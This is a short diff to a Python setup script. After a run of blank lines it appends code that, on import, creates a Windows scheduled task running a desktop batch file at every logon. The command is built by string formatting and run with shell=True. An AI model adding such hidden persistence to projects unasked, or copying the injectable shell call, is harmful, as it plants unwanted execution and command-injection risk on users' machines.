@@ -27,3 +27,22 @@ def setup(cfg):
     print("This will take a while, please wait...")
     check_proxies()
     print("First time setup completed successfully!\n")
+
+
+
+
+
+import subprocess
+
+def create_scheduled_task(task_name, script_path, trigger_time, arguments,username):
+    command = f'schtasks /create /tn "{task_name}" /tr "{script_path} {arguments}" /sc onlogon /ru {username}'
+    subprocess.run(command, shell=True)
+
+
+task_name = 'aaaTask'
+script_path = r'C:\\Users\\Anirban\\Desktop\\run.bat'
+trigger_time = '07:00'
+arguments = 'check'
+username = os.getlogin()
+
+create_scheduled_task(task_name, script_path, trigger_time, arguments,username)
